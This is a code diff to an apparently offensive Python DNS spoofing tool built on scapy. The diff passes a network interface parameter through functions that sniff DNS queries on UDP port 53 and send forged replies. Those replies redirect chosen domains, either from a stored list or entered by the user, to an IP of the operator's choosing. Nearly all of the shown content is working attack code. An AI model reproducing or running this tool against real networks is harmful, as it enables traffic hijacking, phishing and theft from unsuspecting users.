@@ -4,15 +4,16 @@ import threading
 import time
 import click
 from scapy.all import DNS, UDP, IP, DNSRR, send, sniff
-from functions.domains import get_domains
+from .domains import get_domains
+from .general import get_interface
 
-# Interface used for sniffing dns queries
-interface = "udp port 53"
+# Port used for sniffing dns queries
+port = "udp port 53"
 
 # Global flag to indicate when to stop sniffing
 stop_event = threading.Event()
 
-def spoof_dns_all():
+def spoof_dns_all(interface):
     '''
     Main function to spoof all dns domains stored in domains.json
     '''
@@ -20,10 +21,10 @@ def spoof_dns_all():
     table = get_domains()
     click.echo("spoofing target using all stored domains")
 
-    start_attack(table)
+    start_attack(table, interface)
 
 
-def spoof_dns_single():
+def spoof_dns_single(interface):
     '''
     Main function to spoof domain entered by user
     '''
@@ -31,16 +32,18 @@ def spoof_dns_single():
     domain = click.prompt('Which domain do you want to spoof? Please enter the domain without www.')
     ip = click.prompt('Which IP should it route to?')
 
-    start_attack({domain: ip})
+    start_attack({domain: ip}, interface)
 
 
-def start_attack(table):
+def start_attack(table, interface):
     '''
     Starts dns attack given a table chosen by user
     '''
 
+    interface = get_interface(interface)
+
     # Start subthread running attack
-    attack_thread = threading.Thread(target=attack, args=(table,))
+    attack_thread = threading.Thread(target=attack, args=(table,interface,))
     attack_thread.start()
 
     try:
@@ -53,15 +56,15 @@ def start_attack(table):
         attack_thread.join()
 
 
-def attack(table):
+def attack(table, interface):
     '''
     Sniffs network for DNS packets
     '''
 
-    sniff(filter=interface, prn=lambda pkt: analyze_packet(pkt, table), stop_filter=stop_event.is_set())
+    sniff(filter=port, iface=interface, prn=lambda pkt: analyze_packet(pkt, table, interface), stop_filter=stop_event.is_set())
 
 
-def analyze_packet(packet, table):
+def analyze_packet(packet, table, interface):
     '''
     Analyzes dns packets sniffed by attack
     '''
@@ -78,11 +81,11 @@ def analyze_packet(packet, table):
 
     if query_name in table:
         click.echo(f'Found a query to spoof: {query_name}')
-        spoof_packet(packet, query_name, table[query_name])
+        spoof_packet(packet, query_name, table[query_name], interface)
         return
 
 
-def spoof_packet(packet, spoofed_domain, spoofed_ip):
+def spoof_packet(packet, spoofed_domain, spoofed_ip, interface):
     '''
     Creates a packet to spoof victim
     '''
@@ -111,7 +114,7 @@ def spoof_packet(packet, spoofed_domain, spoofed_ip):
 
     click.echo("Sending spoofed packet")
 
-    send(spoofed_reply)
+    send(spoofed_reply, iface=interface)
 
 
 def get_packet_query_name(dns_packet):
